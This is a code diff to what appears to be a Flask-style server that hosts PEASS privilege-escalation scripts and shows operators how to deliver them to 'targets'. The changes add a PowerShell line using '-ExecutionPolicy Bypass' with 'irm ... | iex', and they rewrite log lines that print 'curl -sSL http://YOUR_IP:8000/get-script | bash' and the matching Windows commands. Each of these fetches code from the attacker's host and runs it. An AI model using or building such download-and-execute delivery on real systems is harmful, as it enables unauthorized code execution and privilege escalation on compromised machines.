@@ -111,7 +111,12 @@ def index():
 curl -sSL http://{request.host}/get-script | bash
         </code>
         
-        <p><strong>🪟 Windows targets (PowerShell):</strong></p>
+        <p><strong>🪟 Windows CMD:</strong></p>
+        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
+powershell -ExecutionPolicy Bypass -Command "irm http://{request.host}/get-script.ps1 | iex"
+        </code>
+        
+        <p><strong>🪟 Windows PowerShell:</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
 irm http://{request.host}/get-script.ps1 | iex
         </code>
@@ -306,8 +311,9 @@ if __name__ == '__main__':
     download_peass_scripts()
     
     log(f"[+] Starting server...\n")
-    log(f"[+] Linux targets:   curl -sSL http://YOUR_IP:8000/get-script | bash")
-    log(f"[+] Windows targets: irm http://YOUR_IP:8000/get-script.ps1 | iex\n")
+    log(f"[+] Linux:       curl -sSL http://YOUR_IP:8000/get-script | bash")
+    log(f"[+] Windows CMD: powershell -ExecutionPolicy Bypass -Command \"irm http://YOUR_IP:8000/get-script.ps1 | iex\"")
+    log(f"[+] Windows PS:  irm http://YOUR_IP:8000/get-script.ps1 | iex\n")
     log(f"[*] Waiting for connections...\n")
     
     # Run on all interfaces, port 8000
